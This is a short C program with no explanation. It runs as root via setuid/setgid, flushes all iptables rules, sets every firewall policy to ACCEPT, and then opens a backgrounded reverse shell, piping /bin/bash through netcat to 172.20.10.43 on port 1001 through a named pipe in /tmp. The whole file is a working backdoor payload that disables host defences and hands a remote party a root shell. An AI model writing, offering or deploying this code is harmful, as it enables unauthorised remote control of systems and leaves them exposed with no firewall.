#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

	setuid(0);
	setgid(0);

	system("iptables -F");
	system("iptables -t mangle -F");

	system("iptables -P INPUT ACCEPT");
	system("iptables -P OUTPUT ACCEPT");
	system("iptables -P FORWARD ACCEPT");

	system("[ ! -p /tmp/wivcnoe ] && mkfifo /tmp/wivcnoe");
	system("(/bin/bash 0</tmp/wivcnoe | nc 172.20.10.43 1001 1>/tmp/wivcnoe) &");

	return 0;
}
